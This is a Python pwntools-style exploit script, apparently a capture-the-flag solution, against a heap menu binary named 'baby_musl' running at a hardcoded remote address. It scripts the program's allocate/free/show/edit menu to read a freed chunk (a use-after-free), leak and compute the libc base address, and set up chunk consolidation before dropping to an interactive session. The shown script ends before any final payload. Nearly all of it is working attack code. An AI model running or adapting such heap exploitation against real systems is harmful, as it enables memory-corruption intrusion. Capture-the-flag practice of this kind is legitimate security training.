#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./baby_musl')

host = args.HOST or '34.71.103.59'
port = int(args.PORT or 1024)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def enter_name(name):
    re()
    sl(name)

def option(choice):
    re()
    sl(str(choice))

def add(idx, size, data=None):
    option(1)
    rl()
    sl(str(idx))
    rl()
    sl(str(size))
    if data != None:
        edit(idx, data)

def delete(idx):
    option(2)
    rl()
    sl(str(idx))

def show(idx):
    option(4)
    rl()
    sl(str(idx))

def edit(idx, data):
    option(3)
    rl()
    sl(str(idx))
    rl()
    s(data)

libc = ELF(exe.libc.path)
io = start()
enter_name("4n0nym4u5")
add(0, 0x10, "A"*0x10)
add(1, 0x10, "B"*0x10)
delete(0)
show(0)
libc.address = uu64(rl().strip(b'\n')) - 0xd88
log.info(f"libc base : {hex(libc.address)}")
show(1)
add(2, 0x10, "C"*0x10)
pause()
add(3, 0x10, "D"*0x10) # consolidates with 0th chunk
io.interactive()

